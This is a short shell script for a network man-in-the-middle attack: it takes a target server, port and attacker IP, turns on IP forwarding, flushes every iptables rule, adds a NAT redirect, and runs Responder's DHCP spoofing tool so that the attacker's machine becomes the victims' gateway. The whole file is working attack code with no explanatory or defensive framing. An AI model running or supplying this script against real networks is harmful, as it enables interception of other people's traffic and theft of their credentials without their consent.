#!/bin/sh

checkArgs() {

	if [ $# -lt 3 ]; then
	  echo 1>&2 "[-] Usage: $0 targetserverip port attackerip"
	  exit 1
	fi

	return 1
}

startSpoof() {

	TARGETSERVER=$1
	PORT=$2
	ATTACKER=$3

	printf "[+] Enabling IP Forwarding\n"
	echo 1 > /proc/sys/net/ipv4/ip_forward

	printf "[+] Flushing IP Tables\n"
	iptables -F
	iptables -t nat -F
	iptables -X

	printf "[+] Enabling IP Table PREROUTING\n"
	iptables -t nat -A PREROUTING -p tcp --destination-port $PORT -j REDIRECT --to-port $PORT

	printf "[+] Enabling DHCP Spoofing \n"
	python /usr/share/Responder/tools/DHCP.py -I eth0 \
	-d 8.8.4.4 -r $ATTACKER -p 8.8.8.8 -s 8.8.8.8 -n 255.255.255.0 -R -S

	return 0
}

checkArgs $1 $2 $3 $4 $5
startSpoof $1 $2 $3 $4 $5
